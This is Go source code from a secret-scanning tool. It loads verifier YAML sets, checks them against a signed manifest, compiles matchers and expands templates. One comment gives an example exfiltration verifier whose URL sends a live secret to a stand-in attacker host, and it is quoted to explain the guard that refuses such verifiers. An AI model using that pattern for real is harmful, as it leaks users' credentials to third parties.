package verify

import (
	"bytes"
	"encoding/base64"
	"errors"
	"fmt"
	"io"
	"os"
	"regexp"
	"strings"
	"time"

	"github.com/Lercas/prowl/tool/internal/localfile"
	"github.com/Lercas/prowl/tool/internal/logx"
	"github.com/Lercas/prowl/tool/internal/rules"
	"github.com/Lercas/prowl/tool/internal/safehttp"
	"github.com/Lercas/prowl/tool/internal/saferegex"
	"gopkg.in/yaml.v3"
)

// Load reads verifier YAML from the given files/dirs (dirs walked recursively for *.yaml/*.yml),
// compiles their matchers, and returns a ready Set. Invalid files surface as an error after the
// valid ones load for diagnostics; runtime callers must reject any error to preserve coverage.
// Uses the default bundled-trust policy;
// use LoadWithPolicy for an untrusted/remote set or to opt into --allow-unsigned.
func Load(timeout time.Duration, paths ...string) (*Set, error) {
	return LoadWithPolicy(timeout, LoadPolicy{}, paths...)
}

// LoadWithPolicy is Load with an explicit integrity policy (see LoadPolicy). The default source
// passes the zero value; `verifiers update <remote>` passes TrustUntrusted, refusing a third-party
// set unless --allow-unsigned is given.
func LoadWithPolicy(timeout time.Duration, policy LoadPolicy, paths ...string) (*Set, error) {
	if timeout <= 0 {
		timeout = 8 * time.Second
	}
	s := &Set{client: safehttp.Client(timeout), sem: make(chan struct{}, concurrency)}
	var errs []string
	seen := map[string]string{}
	// add parses one verifier file. signed reports whether the file came from a manifest-verified set,
	// which governs the exfil guard (refuse vs. warn) below.
	add := func(path string, raw []byte, signed bool) {
		dec := yaml.NewDecoder(bytes.NewReader(raw))
		for {
			var doc yaml.Node
			if err := dec.Decode(&doc); err != nil {
				if !errors.Is(err, io.EOF) {
					errs = append(errs, fmt.Sprintf("%s: %v", path, err))
				}
				break
			}
			if len(doc.Content) == 0 || doc.Content[0].Tag == "!!null" {
				continue
			}
			data, err := yaml.Marshal(&doc)
			if err != nil {
				errs = append(errs, fmt.Sprintf("%s: %v", path, err))
				continue
			}
			// Co-located detection templates remain supported, but a broken verifier can never
			// be classified as an unrelated document just because a required field is missing.
			if isDetectionTemplate(doc.Content[0]) {
				if _, err := rules.ParseTemplate(data, path); err != nil {
					errs = append(errs, err.Error())
				}
				continue
			}
			var v Verifier
			strict := yaml.NewDecoder(bytes.NewReader(data))
			strict.KnownFields(true)
			if err := strict.Decode(&v); err != nil {
				errs = append(errs, fmt.Sprintf("%s: %v", path, err))
				continue
			}
			v.path = path
			if err := compileVerifier(&v); err != nil {
				errs = append(errs, err.Error())
				continue
			}
			if prev, exists := seen[v.ID]; exists {
				errs = append(errs, fmt.Sprintf("%s: duplicate verifier id %q (also in %s)", path, v.ID, prev))
				continue
			}
			seen[v.ID] = path
			// Exfil guard (defense in depth): a URL that interpolates the live {{secret}} is the
			// exfil pattern — the SSRF guard allows public hosts, so a verifier like
			// `url: https://attacker.test/?k={{secret}}` would ship the plaintext secret out. Refuse it
			// in an unsigned set; only warn for a manifest-signed set (someone blessed these exact bytes,
			// and a few providers legitimately put the token in the path, e.g. Telegram /bot<token>).
			// --allow-unsigned also downgrades to a warning.
			if bad := exfilRequests(&v); len(bad) > 0 {
				if !signed && !policy.AllowUnsigned {
					logx.Error("refusing verifier: it interpolates the secret into a URL (exfil pattern) in an UNSIGNED set — a legit verifier sends the secret in an Authorization header or POST body, not a URL; sign the set (prowl verifiers manifest) or pass --allow-unsigned to override",
						"verifier", v.ID, "path", path, "requests", bad)
					errs = append(errs, fmt.Sprintf("%s (%s): refusing verifier that interpolates {{secret}} into a URL (exfil pattern) in an unsigned set; sign the set or pass --allow-unsigned", path, v.ID))
					continue
				}
				logx.Warn("verifier interpolates the secret into a URL (exfil pattern) — confirm it targets the provider's own fixed host and not an attacker",
					"verifier", v.ID, "path", path, "requests", bad)
			}
			s.verifiers = append(s.verifiers, &v)
		}
	}
	for _, p := range paths {
		info, err := os.Stat(p)
		if err != nil {
			errs = append(errs, err.Error())
			continue
		}
		if info.IsDir() {
			snapshot, err := readDirectorySnapshot(p, true)
			if err != nil {
				errs = append(errs, err.Error())
				continue
			}
			// Integrity gate: hash every file against the dir's MANIFEST.sha256, refusing a tampered or
			// unlisted set before the parser sees it. signed gates the per-verifier exfil guard.
			_, signed, ierr := checkSnapshot(p, policy, snapshot)
			if ierr != nil {
				logx.Error("verifier set integrity check failed", "error", ierr.Error())
				errs = append(errs, ierr.Error())
				continue // refuse the whole set; do not load any file from it
			}
			for _, file := range snapshot.files {
				add(file.path, file.raw, signed)
			}
		} else {
			raw, err := localfile.ReadRegular(p, MaxVerifierSize)
			if err != nil {
				errs = append(errs, err.Error())
				continue
			}
			add(p, raw, false) // a loose single file has no manifest to bless it
		}
	}
	if len(errs) > 0 {
		return s, fmt.Errorf("%d verifier error(s):\n  %s", len(errs), strings.Join(errs, "\n  "))
	}
	return s, nil
}

func isDetectionTemplate(node *yaml.Node) bool {
	if node.Kind != yaml.MappingNode {
		return false
	}
	template := false
	for i := 0; i+1 < len(node.Content); i += 2 {
		switch node.Content[i].Value {
		case "match", "requests", "extract", "sign", "sign_params":
			return false
		case "matchers", "extractors", "category":
			template = true
		}
	}
	return template
}

func validCombination(value string) bool {
	return value == "" || strings.EqualFold(value, "and") || strings.EqualFold(value, "or")
}

func compileVerifier(v *Verifier) error {
	if strings.TrimSpace(v.ID) == "" || len(v.Match) == 0 || len(v.Requests) == 0 {
		return fmt.Errorf("%s: verifier needs id, match and requests", v.path)
	}
	for _, match := range v.Match {
		if strings.TrimSpace(match) == "" {
			return fmt.Errorf("%s (%s): empty match selector", v.path, v.ID)
		}
	}
	if _, exists := v.Extract["secret"]; exists {
		return fmt.Errorf("%s (%s): extract cannot replace reserved variable secret", v.path, v.ID)
	}
	for i := range v.Requests {
		r := &v.Requests[i]
		if strings.TrimSpace(r.URL) == "" {
			return fmt.Errorf("%s (%s): request %d needs url", v.path, v.ID, i)
		}
		if !validCombination(r.MatchersCondition) {
			return fmt.Errorf("%s (%s): invalid matchers-condition %q", v.path, v.ID, r.MatchersCondition)
		}
		for j := range v.Requests[i].Matchers {
			m := &v.Requests[i].Matchers[j]
			if m.Type == "" {
				m.Type = "status"
			}
			if err := validateMatcher(m); err != nil {
				return fmt.Errorf("%s (%s): %w", v.path, v.ID, err)
			}
			m.res = nil
			for _, rx := range m.Regex {
				if rx == "" {
					return fmt.Errorf("%s (%s): empty regex pattern", v.path, v.ID)
				}
				re, err := saferegex.Compile(rx)
				if err != nil {
					return fmt.Errorf("%s (%s): bad matcher regex %q: %w", v.path, v.ID, rx, err)
				}
				m.res = append(m.res, re)
			}
		}
	}
	for name, rx := range v.Extract {
		re, err := saferegex.Compile(rx)
		if err != nil {
			return fmt.Errorf("%s (%s): bad extract regex %q: %w", v.path, v.ID, rx, err)
		}
		if v.extractRes == nil {
			v.extractRes = map[string]*regexp.Regexp{}
		}
		v.extractRes[name] = re
	}
	if v.Sign != "" {
		if _, ok := signers[v.Sign]; !ok {
			return fmt.Errorf("%s (%s): unknown signer %q", v.path, v.ID, v.Sign)
		}
	}
	return nil
}

func validateMatcher(m *Matcher) error {
	condition := strings.ToLower(m.Condition)
	if condition != "" && condition != "and" && condition != "or" {
		return fmt.Errorf("invalid matcher condition")
	}
	if m.Part != "" && m.Part != "body" && m.Part != "header" {
		return fmt.Errorf("invalid matcher part")
	}
	switch m.Type {
	case "status":
		if len(m.Status) == 0 {
			return fmt.Errorf("empty status matcher")
		}
		for _, code := range m.Status {
			if code < 100 || code > 599 {
				return fmt.Errorf("invalid HTTP status matcher")
			}
		}
	case "word":
		if len(m.Words) == 0 {
			return fmt.Errorf("empty word matcher")
		}
		for _, word := range m.Words {
			if word == "" {
				return fmt.Errorf("empty matcher word")
			}
		}
	case "regex":
		if len(m.Regex) == 0 {
			return fmt.Errorf("empty regex matcher")
		}
		for _, pattern := range m.Regex {
			if pattern == "" {
				return fmt.Errorf("empty matcher regex")
			}
		}
	default:
		return fmt.Errorf("unknown matcher type")
	}
	return nil
}

// Verifiers returns the loaded verifiers.
func (s *Set) Verifiers() []*Verifier { return s.verifiers }

// Path returns the source file the verifier was loaded from.
func (v *Verifier) Path() string { return v.path }

var reInterpolation = regexp.MustCompile(`\{\{base64\(([^)]*)\)\}\}|\{\{([^{}]+)\}\}`)
var reExpressionVar = regexp.MustCompile(`\{\{([^{}]+)\}\}|[A-Za-z_][A-Za-z0-9_]*`)

// expandTemplate expands each original placeholder once. Inserted credentials are literal bytes,
// never another template; bare identifiers inside base64 expressions substitute whole names only.
func expandTemplate(tmpl string, vars map[string]string) (string, error) {
	var problem error
	out := reInterpolation.ReplaceAllStringFunc(tmpl, func(token string) string {
		parts := reInterpolation.FindStringSubmatch(token)
		lookup := func(name, original string, required bool) string {
			value, exists := vars[name]
			if exists && value != "" {
				return value
			}
			if required || exists {
				problem = errBadInterpolation
			}
			return original
		}
		if parts[2] != "" {
			return lookup(parts[2], token, true)
		}
		expr := reExpressionVar.ReplaceAllStringFunc(parts[1], func(word string) string {
			parts := reExpressionVar.FindStringSubmatch(word)
			if parts[1] != "" {
				return lookup(parts[1], word, true)
			}
			return lookup(word, word, false)
		})
		return base64.StdEncoding.EncodeToString([]byte(expr))
	})
	return out, problem
}

func interpolate(tmpl string, vars map[string]string) string {
	out, _ := expandTemplate(tmpl, vars)
	return out
}
